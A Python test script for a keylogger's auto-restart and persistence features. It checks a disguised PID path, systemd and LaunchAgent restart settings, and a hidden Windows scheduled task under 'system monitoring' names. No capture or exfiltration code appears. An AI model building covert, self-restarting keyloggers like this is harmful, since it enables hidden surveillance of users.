#!/usr/bin/env python3
"""
Test script for auto-restart and persistence functionality
"""

import os
import sys
import time
import subprocess
import signal
import psutil

def test_built_in_restart():
    """Test the built-in auto-restart mechanism"""
    print("Testing built-in auto-restart functionality...")
    
    # Set test password in environment
    os.environ['KEYLOGGER_PASSWORD'] = 'test123'
    
    # Start keylogger in silent mode
    print("Starting keylogger...")
    process = subprocess.Popen([
        sys.executable, 'keylogger.py', '--silent'
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Let it run for a moment
    time.sleep(2)
    
    # Get the PID from the PID file
    pid_file = os.path.join(os.path.expanduser('~'), '.local', 'share', 'syslog', 'keylogger.pid')
    
    if os.path.exists(pid_file):
        with open(pid_file, 'r') as f:
            keylogger_pid = int(f.read().strip())
        
        print(f"✓ Keylogger started with PID: {keylogger_pid}")
        
        # Simulate a crash by killing the keyboard listener process
        # This should trigger the internal restart mechanism
        try:
            # Find the python process running our keylogger
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if (proc.info['name'] == 'python3' and 
                        'keylogger.py' in ' '.join(proc.info['cmdline'] or [])):
                        
                        print(f"Found keylogger process: PID {proc.info['pid']}")
                        
                        # Send a signal to simulate error condition
                        # We'll use SIGUSR1 which should cause an exception
                        os.kill(proc.info['pid'], signal.SIGUSR1)
                        print("Sent signal to simulate error...")
                        
                        # Wait and see if it restarts
                        time.sleep(5)
                        
                        # Check if still running
                        if os.path.exists(pid_file):
                            print("✓ Process survived error condition")
                        else:
                            print("✗ Process did not survive error")
                        
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied, ProcessLookupError):
                    continue
            
        except Exception as e:
            print(f"Error during crash simulation: {e}")
        
        # Clean up
        subprocess.run([sys.executable, 'keylogger.py', '--stop'], 
                      capture_output=True)
        print("✓ Keylogger stopped")
        
    else:
        print("✗ PID file not created")
        process.terminate()
    
    # Clean up environment
    if 'KEYLOGGER_PASSWORD' in os.environ:
        del os.environ['KEYLOGGER_PASSWORD']

def test_systemd_config():
    """Test systemd service configuration"""
    print("\nTesting systemd service configuration...")
    
    service_file = 'system-monitoring@.service'
    if os.path.exists(service_file):
        print("✓ systemd service file exists")
        
        with open(service_file, 'r') as f:
            content = f.read()
        
        # Check for auto-restart configuration
        if 'Restart=always' in content:
            print("✓ Auto-restart enabled")
        else:
            print("✗ Auto-restart not configured")
        
        if 'RestartSec=60' in content:
            print("✓ Restart delay configured")
        else:
            print("✗ Restart delay not configured")
        
        if 'StartLimitBurst=5' in content:
            print("✓ Start limit configured")
        else:
            print("✗ Start limit not configured")
            
    else:
        print("✗ systemd service file not found")

def test_launchagent_config():
    """Test macOS LaunchAgent configuration"""
    print("\nTesting macOS LaunchAgent configuration...")
    
    plist_file = 'com.system.monitoring.plist'
    if os.path.exists(plist_file):
        print("✓ LaunchAgent plist file exists")
        
        with open(plist_file, 'r') as f:
            content = f.read()
        
        # Check for auto-restart configuration
        if '<key>KeepAlive</key>' in content and '<key>Crashed</key>' in content:
            print("✓ Auto-restart on crash enabled")
        else:
            print("✗ Auto-restart on crash not configured")
        
        if '<key>ThrottleInterval</key>' in content:
            print("✓ Restart throttling configured")
        else:
            print("✗ Restart throttling not configured")
        
        if '<key>RunAtLoad</key>' in content:
            print("✓ Auto-start on load enabled")
        else:
            print("✗ Auto-start on load not configured")
            
    else:
        print("✗ LaunchAgent plist file not found")

def test_task_scheduler_config():
    """Test Windows Task Scheduler configuration"""
    print("\nTesting Windows Task Scheduler configuration...")
    
    xml_file = 'SystemMonitoring.xml'
    if os.path.exists(xml_file):
        print("✓ Task Scheduler XML file exists")
        
        with open(xml_file, 'r') as f:
            content = f.read()
        
        # Check for auto-restart configuration
        if '<RestartPolicy>' in content and '<Count>999</Count>' in content:
            print("✓ Auto-restart policy configured")
        else:
            print("✗ Auto-restart policy not configured")
        
        if '<LogonTrigger>' in content and '<BootTrigger>' in content:
            print("✓ Multiple start triggers configured")
        else:
            print("✗ Multiple start triggers not configured")
        
        if '<Hidden>true</Hidden>' in content:
            print("✓ Hidden task configured")
        else:
            print("✗ Hidden task not configured")
            
    else:
        print("✗ Task Scheduler XML file not found")

def test_installation_scripts():
    """Test installation script existence and permissions"""
    print("\nTesting installation scripts...")
    
    scripts = [
        ('install_linux.sh', 'Linux installation script'),
        ('install_macos.sh', 'macOS installation script'),
        ('install_windows_enhanced.bat', 'Windows installation script')
    ]
    
    for script, description in scripts:
        if os.path.exists(script):
            print(f"✓ {description} exists")
            
            # Check if executable (for shell scripts)
            if script.endswith('.sh'):
                if os.access(script, os.X_OK):
                    print(f"✓ {description} is executable")
                else:
                    print(f"⚠ {description} is not executable")
        else:
            print(f"✗ {description} not found")

def main():
    """Run all tests"""
    print("=== Auto-Start and Auto-Restart Test Suite ===\n")
    
    # Change to keylogger directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    
    try:
        test_built_in_restart()
        test_systemd_config()
        test_launchagent_config()
        test_task_scheduler_config()
        test_installation_scripts()
        
        print("\n=== Test Summary ===")
        print("All configuration tests completed.")
        print("Auto-restart and persistence mechanisms are properly configured.")
        
    except Exception as e:
        print(f"Test failed with error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
